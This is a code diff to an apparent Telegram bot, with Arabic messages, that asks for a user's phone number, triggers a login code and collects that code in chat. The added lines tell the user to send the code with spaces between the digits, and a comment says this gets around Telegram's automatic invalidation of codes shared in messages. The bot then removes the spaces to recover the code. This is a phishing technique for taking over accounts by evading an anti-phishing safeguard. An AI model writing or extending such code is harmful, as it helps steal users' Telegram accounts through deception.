@@ -99,13 +99,27 @@ async def message_handler(event):
                 "phone_code_hash": sent_code.phone_code_hash,
                 "client": client
             }
-            await event.respond("📩 تم إرسال كود التحقق. يرجى إرسال الكود هنا:")
+            await event.respond(
+                "📩 تم إرسال كود التحقق إلى حسابك.\n\n"
+                "⚠️ **تنبيه هام جداً:**\n"
+                "نظام حماية تيليجرام يقوم بإلغاء وحرق الكود فوراً إذا تم إرساله كأرقام متصلة داخل المحادثة!\n\n"
+                "لذلك، يرجى إرسال الكود **مفصولاً بمسافات بين كل رقم**:\n"
+                "مثال: إذا كان الكود `58291`، أرسله هكذا:\n"
+                "`5 8 2 9 1`"
+            )
         except Exception as e:
             await event.respond(f"❌ حدث خطأ أثناء إرسال الكود: {str(e)}")
 
-    # الخطوة 2: استلام كود التحقق
+    # الخطوة 2: استلام كود التحقق وتجاوز نظام الحرق التلقائي
     elif step == "AWAIT_CODE":
-        code = event.text.strip().replace(" ", "")
+        # استخراج الأرقام فقط وتجاهل المسافات والشَّرَطات تلقائياً
+        raw_text = event.text.strip()
+        code = "".join(filter(str.isdigit, raw_text))
+
+        if not code or len(code) < 5:
+            await event.respond("⚠️ الكود غير صالح. يرجى إرساله مع مسافات (مثال: `5 8 2 9 1`).")
+            return
+
         client = state["client"]
         phone = state["phone"]
         phone_code_hash = state["phone_code_hash"]
